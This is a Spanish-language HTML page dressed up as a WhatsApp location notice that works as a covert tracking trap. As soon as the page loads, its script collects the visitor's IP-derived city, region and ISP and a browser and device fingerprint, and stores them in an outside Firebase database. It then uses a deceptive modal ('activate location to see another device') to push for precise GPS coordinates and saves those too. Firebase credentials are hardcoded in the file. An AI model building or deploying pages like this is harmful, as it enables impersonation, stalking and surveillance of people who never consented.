<!DOCTYPE html>
<html lang="es">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>whatsApp</title>
<style>
.imagen-superior{
    display:block;
    width:140px;
    margin:20px auto;
    border-radius:15px;
}
body{
    margin:0;
    padding:20px;
    font-family:Arial, sans-serif;
    background: linear-gradient(180deg, #7ED957, #25D366);  
    min-height:100vh;
    text-align:center;
}
h2{
    color:#075E54;
    font-size:32px;
    margin-bottom:10px;
}
p{
    color:#128C7E;
    font-size:18px;
    margin-bottom:20px;
}
iframe{
    width:100%;
    height:350px;
    border:none;
    border-radius:15px;
    box-shadow:0 5px 15px rgba(0,0,0,.25);
}
.modal{
    display:none;
    position:fixed;
    top:0;
    left:0;
    width:100%;
    height:100%;
    background:rgba(0,0,0,.6);
    justify-content:center;
    align-items:center;
    z-index:9999;
}
.modal-contenido{
    background:#fff;
    width:300px;
    padding:20px;
    border-radius:15px;
    text-align:center;
    box-shadow:0 5px 15px rgba(0,0,0,.3);
}
.modal-contenido h3{
    color:#075E54;
    margin-bottom:10px;
}
.modal-contenido p{
    color:#444;
    margin-bottom:20px;
}
.modal-contenido button{
    background:#25D366;
    color:#fff;
    border:none;
    padding:10px 20px;
    border-radius:8px;
    cursor:pointer;
}
</style>
</head>
<body>

<img src="logowhatsapp.jpg" alt="Logo" class="imagen-superior">

<h2>WhatsApp obtuvo la ubicación ...</h2>

<p id="estado">Cargando datos de IP...</p>

<iframe src="https://www.google.com/maps?q=Colombia&output=embed"></iframe>

<div id="miAlerta" class="modal">
    <div class="modal-contenido">
        <img src="imagenubicacion.jpg" class="imagen-superior" alt="Logo">
        <h3>Permiso de ubicación</h3>
        <p id="textoAlerta"></p>
        <button id="btnAceptar">Aceptar</button>
    </div>
</div>

<script type="module">

import { initializeApp } from "https://www.gstatic.com/firebasejs/12.0.0/firebase-app.js";
import {
    getFirestore,
    collection,
    addDoc,
    updateDoc,
    doc,
    serverTimestamp
} from "https://www.gstatic.com/firebasejs/12.0.0/firebase-firestore.js";

const firebaseConfig = {
    apiKey: "AIzaSyDSWRC7tyowLD-ZnzvSzkTDS9L3P_eGfRM",
    authDomain: "proyecto-1-ea0ed.firebaseapp.com",
    projectId: "proyecto-1-ea0ed",
    storageBucket: "proyecto-1-ea0ed.firebasestorage.app",
    messagingSenderId: "440062306942",
    appId: "1:440062306942:web:74eab86708e22587d7462f"
};

const app = initializeApp(firebaseConfig);
const db = getFirestore(app);
const estado = document.getElementById("estado");

// ---------- VARIABLES GLOBALES ----------
let docId = null;               // ID del documento creado con los datos de IP
let datosIP = {};               // objeto con los datos de la IP
let ubicacionObtenida = false;  // para evitar redirigir dos veces

// ---------- MOSTRAR / CERRAR MODAL ----------
function mostrarAlerta(texto){
    document.getElementById("textoAlerta").textContent = texto;
    document.getElementById("miAlerta").style.display = "flex";
}

function cerrarAlerta(){
    document.getElementById("miAlerta").style.display = "none";
    // Al hacer clic en Aceptar, reintentamos obtener ubicación
    if (!ubicacionObtenida) {
        solicitarUbicacion();
    }
}

document.getElementById("btnAceptar").addEventListener("click", cerrarAlerta);

// ---------- OBTENER DATOS DE IP ----------
async function obtenerDatosIP() {
    try {
        const respuesta = await fetch("https://ipapi.co/json/");
        if (!respuesta.ok) throw new Error("Error al consultar ipapi");
        const data = await respuesta.json();
        return {
            ip: data.ip || "Desconocido",
            ciudad: data.city || "Desconocido",
            region: data.region || "Desconocido",
            pais: data.country_name || "Desconocido",
            proveedor: data.org || "Desconocido",
            zonaHoraria: data.timezone || "Desconocido"
        };
    } catch (error) {
        console.error("Error obteniendo IP:", error);
        return {
            ip: "No disponible",
            ciudad: "No disponible",
            region: "No disponible",
            pais: "No disponible",
            proveedor: "No disponible",
            zonaHoraria: "No disponible"
        };
    }
}

// ---------- GUARDAR DOCUMENTO INICIAL (solo IP y datos de navegador) ----------
async function guardarDatosIniciales() {
    try {
        const docRef = await addDoc(collection(db, "ubicaciones"), {
            // Datos de IP
            ip: datosIP.ip,
            ciudad: datosIP.ciudad,
            region: datosIP.region,
            pais: datosIP.pais,
            proveedor: datosIP.proveedor,
            zonaHoraria: datosIP.zonaHoraria,

            // Datos del navegador / dispositivo
            userAgent: navigator.userAgent,
            idioma: navigator.language,
            plataforma: navigator.platform,
            anchoPantalla: screen.width,
            altoPantalla: screen.height,

            // Campos de ubicación (vacíos hasta que se obtenga GPS)
            lat: null,
            lon: null,
            precision: null,

            // Timestamp de creación
            fecha: serverTimestamp(),
            // Indicador de si se obtuvo ubicación
            ubicacion_obtenida: false
        });

        docId = docRef.id;
        console.log("Documento inicial creado con ID:", docId);
        estado.textContent = "✅ Datos de IP guardados. Solicitando ubicación...";
        return true;
    } catch (error) {
        console.error("Error al guardar datos iniciales:", error);
        estado.textContent = "⚠️ Error al guardar datos iniciales.";
        return false;
    }
}

// ---------- ACTUALIZAR DOCUMENTO CON UBICACIÓN ----------
async function actualizarConUbicacion(posicion) {
    if (!docId) {
        console.error("No hay docId para actualizar");
        return false;
    }
    try {
        const docRef = doc(db, "ubicaciones", docId);
        await updateDoc(docRef, {
            lat: posicion.coords.latitude,
            lon: posicion.coords.longitude,
            precision: posicion.coords.accuracy,
            ubicacion_obtenida: true,
            fecha_ubicacion: serverTimestamp()
        });
        console.log("Ubicación actualizada en el documento", docId);
        return true;
    } catch (error) {
        console.error("Error al actualizar con ubicación:", error);
        return false;
    }
}

// ---------- SOLICITAR UBICACIÓN (con reintento) ----------
function solicitarUbicacion() {
    if (!navigator.geolocation) {
        mostrarAlerta("Tu navegador no soporta geolocalización.");
        return;
    }

    estado.textContent = "📍 Solicitando permiso de ubicación...";

    navigator.geolocation.getCurrentPosition(
        async function(posicion) {
            // Éxito: actualizar el documento y redirigir
            ubicacionObtenida = true;
            estado.textContent = "📍 Ubicación obtenida, actualizando...";
            const actualizado = await actualizarConUbicacion(posicion);
            if (actualizado) {
                estado.textContent = "✅ Información completa guardada. Abriendo Google Maps...";
                const lat = posicion.coords.latitude;
                const lon = posicion.coords.longitude;
                setTimeout(() => {
                    window.location.href = "https://www.google.com/maps?q=" + lat + "," + lon;
                }, 2500);
            } else {
                estado.textContent = "⚠️ No se pudo actualizar la ubicación.";
            }
        },
        function(error) {
            // Error: mostrar modal con el mensaje adecuado
            let mensaje = "";
            switch(error.code) {
                case error.PERMISSION_DENIED:
                    mensaje = "Activa la ubicación para ver otro dispositivo.";
                    break;
                case error.POSITION_UNAVAILABLE:
                    mensaje = "No fue posible obtener la ubicación.";
                    break;
                case error.TIMEOUT:
                    mensaje = "La solicitud tardó demasiado.";
                    break;
                default:
                    mensaje = "Ocurrió un error desconocido.";
            }
            mostrarAlerta(mensaje);
            estado.textContent = "⚠️ " + mensaje;
        },
        {
            enableHighAccuracy: true,
            timeout: 10000,
            maximumAge: 0
        }
    );
}

// ---------- FLUJO PRINCIPAL ----------
(async function main() {
    // 1. Obtener IP
    estado.textContent = "🌐 Obteniendo datos de IP...";
    datosIP = await obtenerDatosIP();

    // 2. Guardar documento inicial con IP y datos de navegador
    const guardado = await guardarDatosIniciales();
    if (!guardado) {
        // Si falla el guardado inicial, mostramos error y no continuamos
        estado.textContent = "⚠️ Error crítico al guardar. Recarga la página.";
        return;
    }

    // 3. Solicitar ubicación (si se obtiene, actualiza el mismo documento)
    solicitarUbicacion();
})();

</script>

</body>
</html>
